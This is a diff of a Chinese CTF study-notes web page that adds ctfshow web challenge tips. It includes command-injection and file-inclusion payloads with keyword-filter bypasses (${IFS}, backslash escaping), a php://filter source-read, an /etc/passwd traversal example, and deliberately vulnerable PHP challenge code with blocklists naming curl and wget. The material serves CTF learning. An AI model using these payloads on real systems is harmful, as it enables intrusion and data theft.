@@ -246,6 +246,9 @@
 <p><strong>payload</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[f]?&gt;&amp;f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>tips：include不用括号，分号可以用?&gt;代替</p>
+</blockquote>
 <p><a href="https://sheeprooo.top/2021/05/27/CTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/##php">php://协议笔记</a></p>
 <h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">## -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment">## <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">## <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -450,6 +453,9 @@
 <p>先使用<code>pwd</code>命令显示当前路径，得到是默认的 /var/www/html</p>
 <p>然后<code>?c=cp$&#123;IFS&#125;/fla\g$&#123;IFS&#125;/var/www/html/||ls</code></p>
 <p>当前目录下即出现 flag 文件，重命名后访问即可<code>?c=cp$&#123;IFS&#125;fla\g$&#123;IFS&#125;a.txt||ls</code></p>
+<blockquote>
+<p>或者<code>?c=ta\c$&#123;IFS&#125;/fla\g||ls</code>即可</p>
+</blockquote>
 <h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 18:21:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>先输出参数 c 的值，然后输出system() 的返回值</p>
@@ -464,6 +470,12 @@
 <p><code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>然后访问 a.txt 即可</p>
 <blockquote>
 <p><em><code>?c=cp$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>不可以</em></p>
+</blockquote>
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>shell 编程是以”#”为注释，但对<code>#!/bin/sh</code>却不是，<code>#!/bin/sh</code>是对shell的声明，说明你所用的是那种类型的shell及其路径所在</p>
+<p><code>#! /bin/sh</code>是指此脚本使用/bin/sh来解释执行，<code>#!</code>是特殊的表示符，其后面跟的是解释此脚本的shell的路径，如果没有声明，则脚本将在默认的shell中执行，默认shell是由用户所在的系统定义为执行shell脚本的shell.如果脚本被编写为在Kornshell ksh中运行，而默认运行shell脚本的为C shell csh,则脚本在执行过程中很可能失败。所以建议大家就把”#!/bin/sh”当成C 语言的main函数一样，写shell必须有，以使shell程序更严密</p>
 </blockquote>
 <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">## -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment">## <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment">## <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">## <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -2297,7 +2309,7 @@
 <p><a href="ftp://ftp.is.co.za/rfc/rfc1808.txt">ftp://ftp.is.co.za/rfc/rfc1808.txt</a>   </p>
 <p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a>    </p>
 <p>ldap://[2001:db8::7]/c=GB?objectClass?one    </p>
-<p>mailto:<a href="mailto:&#74;&#111;&#x68;&#110;&#x2e;&#68;&#x6f;&#101;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#x63;&#111;&#109;">&#74;&#111;&#x68;&#110;&#x2e;&#68;&#x6f;&#101;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#x63;&#111;&#109;</a>    </p>
+<p>mailto:<a href="mailto:&#74;&#111;&#104;&#110;&#46;&#x44;&#111;&#101;&#64;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;">&#74;&#111;&#104;&#110;&#46;&#x44;&#111;&#101;&#64;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;</a>    </p>
 <p>news:comp.infosystems.<a href="http://www.servers.unix/">www.servers.unix</a>    </p>
 <p>tel:+1-816-555-1212    </p>
 <p>telnet://192.0.2.16:80/    </p>
@@ -2790,6 +2802,16 @@
 <ul>
 <li>返回值：返回数组中的当前元素的值，如果当前元素为空或者当前元素没有值则返回 FALSE</li>
 <li>PHP版本：4+</li>
+</ul>
+</li>
+</ul>
+<h4 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a>dirname()</h4><blockquote>
+<p>dirname() 函数返回路径中的目录名称部分</p>
+</blockquote>
+<ul>
+<li><strong>语法</strong>：<code>dirname(path)</code></li>
+<li><strong>参数</strong>：<ul>
+<li>path：必需。规定要检查的路径</li>
 </ul>
 </li>
 </ul>
@@ -3838,6 +3860,11 @@
 <p>系统在处理过长的路径时会选择主动截断它</p>
 <p><strong>示例</strong>：<code>?file=../../../////////&#123;*N&#125;/etc/passwd</code></p>
 <h4 id="截断-1"><a href="#截断-1" class="headerlink" title="?截断"></a><em>?截断</em></h4><p>远程文件包含的URL<code>?</code>后面的代码被解释为querystring</p>
+<h3 id="无数字字母webshell"><a href="#无数字字母webshell" class="headerlink" title="无数字字母webshell"></a>无数字字母webshell</h3><div class="note info flat"><p>转载自P神博客</p>
+</div>
+
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="快速参照表-1"><a href="#快速参照表-1" class="headerlink" title="快速参照表"></a>快速参照表</h2><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><div class="hide-toggle"><div class="hide-button toggle-title" style><i class="fas fa-caret-right fa-fw"></i><span>文件格式</span></div>
     <div class="hide-content"><table>
 <thead>
